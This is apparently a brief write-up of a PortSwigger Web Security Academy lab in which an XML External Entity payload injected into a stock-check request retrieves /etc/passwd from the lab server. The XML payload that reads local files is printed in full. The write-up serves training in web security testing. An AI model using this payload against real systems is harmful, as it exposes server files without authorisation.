Lab Details
Lab: PortSwigger Web Security Academy - XXE with file retrieval

Endpoint: POST /product/stock

Content-Type: application/xml

Vulnerability Type: XML External Entity (XXE) Injection

Lab Setup

Target: 0acd00df04fa645a80927bf900b8005b.web-security-academy.net
Endpoint: /product/stock
Method: POST
Content-Type: application/xml
Discovery Process
Step 1: Identify XML Input

Endpoint accepts XML via POST requests

Application processes productId and storeId elements

Response returns stock quantity

Step 2: Initial Test Payload

xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
Step 3: Successful Exploitation

Server processed the external entity

/etc/passwd file contents returned in response

Vulnerability confirmed

